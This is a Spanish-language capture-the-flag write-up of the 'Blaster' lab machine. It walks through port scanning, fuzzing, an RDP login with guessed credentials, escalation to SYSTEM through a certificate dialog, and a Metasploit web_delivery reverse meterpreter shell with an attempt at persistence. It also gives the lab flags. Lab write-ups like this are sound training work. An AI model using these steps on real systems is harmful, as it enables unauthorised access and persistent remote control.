Lo primero que haremos será hacer un nmap y enumerar los puertos abiertos


![Write_up_maquinas/maquina3-bluster/img/img01.png](https://github.com/alvarobueno21/Hacking_Etico/blob/ddb1d83cc03a05b359f343c74555f284a59ef527/Write_up_maquinas/maquina3-bluster/img/img01.png)


Una vez hecho esto haremos fuzzing y encontramos una ruta /retro


![Write_up_maquinas/maquina3-bluster/img/img02.png](https://github.com/alvarobueno21/Hacking_Etico/blob/ddb1d83cc03a05b359f343c74555f284a59ef527/Write_up_maquinas/maquina3-bluster/img/img02.png)


Nos vamos a la pagina y encontramos que el nombre de Wade se refiere a un personaje de avatar que se llama parzival

![Write_up_maquinas/maquina3-bluster/img/img03.png](https://github.com/alvarobueno21/Hacking_Etico/blob/ddb1d83cc03a05b359f343c74555f284a59ef527/Write_up_maquinas/maquina3-bluster/img/img03.png)

Ahora nos conectaremos por rdp, si no lo tenemos instalado lo instalamos con el siguiente comando:

sudo apt update && sudo apt install freerdp2-x11

Y luego para conectarnos por rdp a la maquina lo haremos con este otro comando:

xfreerdp /u:wade /p:parzival /v:192.168.1.211

Y si miramos el documento de texto del escritorio tenemos esta flag: THM{HACK_PLAYER_ONE}

Si nos fijamos bien en el escritorio, hay un ejecutable, le damos a abrir con administrador y hacemos click en Show details y luego nos saldra una pestaña para ver información sobre el certificado, hacemos click en ella y nos vamos a su pagina web.

![Write_up_maquinas/maquina3-bluster/img/img04.png](https://github.com/alvarobueno21/Hacking_Etico/blob/ddb1d83cc03a05b359f343c74555f284a59ef527/Write_up_maquinas/maquina3-bluster/img/img04.png)

Luego tendremos que irnos al navegador, configuración y guardar archivo y nos vamos a la ruta C:\Windows\System32 y luego en la parte de arriba pondremos C:\Windows\System32\cmd.exe, abrimos la cmd y ejecutamos whoaami y somos nt authority\system.

![Write_up_maquinas/maquina3-bluster/img/img05.png](https://github.com/alvarobueno21/Hacking_Etico/blob/02e1892b61915bcb643f7e93fd2eb0311651ed9b/Write_up_maquinas/maquina3-bluster/img/img05.png)

Si entramos en la terminal y hacemos un dir vemos un root.txt donde esta la flag.

![Write_up_maquinas/maquina3-bluster/img/img06.png](https://github.com/alvarobueno21/Hacking_Etico/blob/02e1892b61915bcb643f7e93fd2eb0311651ed9b/Write_up_maquinas/maquina3-bluster/img/img06.png)

Ahora nos iremos a hacer un sudo msfconsole y con el comando search exploit/multi/script/web_delivery nos pondremos a ejecutar el exploit.

![Write_up_maquinas/maquina3-bluster/img/img07.png](https://github.com/alvarobueno21/Hacking_Etico/blob/02e1892b61915bcb643f7e93fd2eb0311651ed9b/Write_up_maquinas/maquina3-bluster/img/img07.png)

Ahora tendremos que poner el siguiente comando: set payload windows/meterpreter/reverse_http y luego ejecutar run -j

![Write_up_maquinas/maquina3-bluster/img/img08.png](https://github.com/alvarobueno21/Hacking_Etico/blob/02e1892b61915bcb643f7e93fd2eb0311651ed9b/Write_up_maquinas/maquina3-bluster/img/img08.png)

Una vez hagamos esto tendremos que copiarnos la salida del comando y ejecutarlo en la shell de windows, primero nos abrimos un servidor python en nuestro kali con python3 -m http.server y nos copiamos el contenido del fichero a la powershell de Windows.

Luego si nos vamos a metasploit nos debería de crear una reverse shell y si ejecutamos persistence -X podremos obtener persistencias pero desgraciadamente no hemos podido crearla ya que una vez metiamos este comando en el windows se nos cerraba la powershell y metasploit no nos dejaba crear la reverse shell.

